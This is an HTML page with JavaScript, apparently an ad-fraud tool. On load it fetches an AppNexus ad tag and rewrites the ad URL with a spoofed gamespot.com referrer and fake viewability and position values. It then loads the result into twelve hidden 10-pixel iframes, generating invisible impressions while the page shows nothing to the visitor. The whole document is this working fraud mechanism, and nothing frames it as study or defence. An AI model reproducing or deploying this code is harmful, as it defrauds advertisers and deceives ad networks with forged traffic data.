<script type="text/javascript">
//用于创建XMLHttpRequest对象
function createXmlHttp() {
 //根据window.XMLHttpRequest对象是否存在使用不同的创建方式
    if (window.XMLHttpRequest) {
       xmlHttp = new XMLHttpRequest();                  //FireFox、Opera等浏览器支持的创建方式
    } else {
       xmlHttp = new ActiveXObject("Microsoft.XMLHTTP");//IE浏览器支持的创建方式
    }
}
//直接通过XMLHttpRequest对象获取远程网页源代码
function getSource() {
    var url = document.getElementById("url").value;             //获取目标地址信
    createXmlHttp();                                            //创建XMLHttpRequest对象
    xmlHttp.onreadystatechange = writeSource;                   //设置回调函数
    xmlHttp.open("GET", url, true);
    xmlHttp.send(null);
}
//将远程网页源代码写入页面文字区域
function writeSource() {
    if (xmlHttp.readyState == 4) {
        var apn_data=xmlHttp.responseText;
        var start1=apn_data.indexOf("http://");
        var stop1=apn_data.indexOf(";s+");
        var adurl=apn_data.substring(stop1-2,start1);
        adurl=adurl.replace("ttj?","tt?");      
        adurl=adurl+".&bdref=http%3A%2F%2Fwww.gamespot.com%2F&bdtop=true&bdifs=0&bstk=http%3A%2F%2Fwww.gamespot.com%2F&view_iv=1&view_pos=750,360&view_ws=1340,360&view_vs=&id=5883479";
        
        
document.getElementById("app1").src=adurl;
document.getElementById("app2").src=adurl;
document.getElementById("app3").src=adurl;
document.getElementById("app4").src=adurl;
document.getElementById("app5").src=adurl;
document.getElementById("app6").src=adurl;
document.getElementById("app7").src=adurl;
document.getElementById("app8").src=adurl;
document.getElementById("app9").src=adurl;
document.getElementById("app10").src=adurl;
document.getElementById("app11").src=adurl;
document.getElementById("app12").src=adurl;
        //location.href ="ad2.html?url=" + encodeURIComponent(adurl);
        
        //location.href =adurl;
    }
}
</script>



<body onload="getSource()"></body>

<div>
          <input type="hidden" id="url" value="http://ib.adnxs.com/tt?id=5883479">
          
</div>
<iframe id="app1" width="10" height="10" frameborder="no" border="0" marginwidth="0" marginheight="0" scrolling="no" allowtransparency="yes"></iframe>
<iframe id="app2" width="10" height="10" frameborder="no" border="0" marginwidth="0" marginheight="0" scrolling="no" allowtransparency="yes"></iframe>     
<iframe id="app3" width="10" height="10" frameborder="no" border="0" marginwidth="0" marginheight="0" scrolling="no" allowtransparency="yes"></iframe>
<iframe id="app4" width="10" height="10" frameborder="no" border="0" marginwidth="0" marginheight="0" scrolling="no" allowtransparency="yes"></iframe>
<iframe id="app5" width="10" height="10" frameborder="no" border="0" marginwidth="0" marginheight="0" scrolling="no" allowtransparency="yes"></iframe>
<iframe id="app6" width="10" height="10" frameborder="no" border="0" marginwidth="0" marginheight="0" scrolling="no" allowtransparency="yes"></iframe>
<iframe id="app7" width="10" height="10" frameborder="no" border="0" marginwidth="0" marginheight="0" scrolling="no" allowtransparency="yes"></iframe>
<iframe id="app8" width="10" height="10" frameborder="no" border="0" marginwidth="0" marginheight="0" scrolling="no" allowtransparency="yes"></iframe>
<iframe id="app9" width="10" height="10" frameborder="no" border="0" marginwidth="0" marginheight="0" scrolling="no" allowtransparency="yes"></iframe>
<iframe id="app10" width="10" height="10" frameborder="no" border="0" marginwidth="0" marginheight="0" scrolling="no" allowtransparency="yes"></iframe>
<iframe id="app11" width="10" height="10" frameborder="no" border="0" marginwidth="0" marginheight="0" scrolling="no" allowtransparency="yes"></iframe>
<iframe id="app12" width="10" height="10" frameborder="no" border="0" marginwidth="0" marginheight="0" scrolling="no" allowtransparency="yes"></iframe>


